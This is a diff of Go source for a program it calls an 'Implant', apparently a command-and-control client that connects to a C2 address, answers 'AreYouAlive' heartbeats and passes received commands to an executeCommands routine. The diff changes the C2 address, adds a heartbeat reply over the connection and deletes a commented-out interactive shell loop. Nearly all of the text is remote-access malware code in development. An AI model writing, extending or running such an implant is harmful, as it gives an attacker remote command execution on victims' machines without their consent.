@@ -159,7 +159,7 @@ func ls(conn *net.Conn, implantWD *string) {
 // }
 
 func main() {
-	c2Address := "192.168.5.222:8000"
+	c2Address := "192.168.1.13:400"
 	attempts := 0
 	//implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -172,26 +172,10 @@ func main() {
 		command := listen4Commands(&conn)
 		fmt.Println(command)
 		if command == "AreYouAlive\n" {
-			fmt.Println("I AM ALIVE")
+			fmt.Println("IAMALIVE")
+			conn.Write([]byte("IAMALIVE"))
 			continue
 		}
 		executeCommands(&conn, &command)
-		// switch command {
-		// case "shell\n":
-		// 	{
-		// 		for {
-		// 			command = listen4Commands(&conn)
-		// 			// if cd(&conn, &command, &implantWD) {
-		// 			// 	continue
-		// 			// }
-		// 			// if command == "ls\n" {
-		// 			// 	ls(&conn, &implantWD)
-		// 			// 	continue
-		// 			// }
-		// 			if command == "bg\n" {
-		// 				break
-		// 			}
-		// 			executeCommands(&conn, &command)
-		// 		}
 	}
 }
